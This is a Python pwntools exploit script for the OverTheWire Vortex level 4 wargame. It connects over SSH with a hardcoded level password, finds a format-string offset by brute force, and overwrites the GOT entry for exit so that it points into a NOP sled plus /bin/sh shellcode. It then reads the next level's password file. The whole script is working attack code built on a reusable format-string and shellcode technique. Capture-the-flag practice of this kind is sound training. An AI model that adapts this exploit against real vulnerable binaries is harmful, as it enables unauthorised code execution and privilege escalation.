from pwn import *
from libformatstr import FormatStr

context.arch='i386'
context.os='linux'

s = ssh(host='vortex.labs.overthewire.org', user='vortex4', password='2YmgK1=jw')
s.download_file('/vortex/vortex4')

# compile files that prepare the env
s.upload_file('level4.c', remote='/tmp/level4.c')
s.run_to_end('gcc -m32 -o /tmp/v4 /tmp/level4.c', wd='/tmp')

s.upload_file('leaker.c', remote='/tmp/leaker.c')
s.run_to_end('gcc -m32 -o /tmp/leaker /tmp/leaker.c', wd='/tmp')


def run(payload, prog='/vortex/vortex4', getflag=False):
    p = s.run("/tmp/v4 %s '%s'" % (prog, payload))
    if getflag:
        p.clean()
        p.send('cat /etc/vortex_pass/vortex5\n')
        return p.recvline()
    else:
        return p.recvall()

def get_offset(size=100, start=1, end=201):
    offsets = []

    for x in xrange(start, end):
        payload = 'A' * 8 + '%%%d$p' % x
        payload += 'X' * (size - len(payload))
        assert size == len(payload)
        output = run(payload)

        if output.startswith('A' * 8 + '0x41414141'):
            offsets.append(x)

    for offset in offsets:
        for shift in xrange(4):
            payload = "X" * shift + 'ABCD' + '%%%d$p' % offset
            payload += 'X' * (size - len(payload))
            assert size == len(payload)

            output = run(payload)

            if output.startswith('X' * shift + 'ABCD0x44434241'):
                return offset, shift

    raise PwnlibException('Could not find valid offset')

size = 200

exe = ELF('./vortex4')

leaked = int(run('X' * size, prog='/tmp/leaker'), base=16)

offset, padding = get_offset(size=size, start=100, end=101)

f = FormatStr()
f[exe.got['exit']] = leaked + 50

fmt = f.payload(offset, padding=padding)

shellcode = fmt + asm(shellcraft.nop() * 50 + shellcraft.sh())
shellcode += 'X' * (size - len(shellcode))

assert len(shellcode) == size

log.info('Offset: %d', offset)
log.info('Padding: %d', padding)
log.info('Ptr: 0x%x', leaked)
log.info('GOT: 0x%x', exe.got['exit'])

log.success('Flag: %s', run(shellcode, getflag=True))
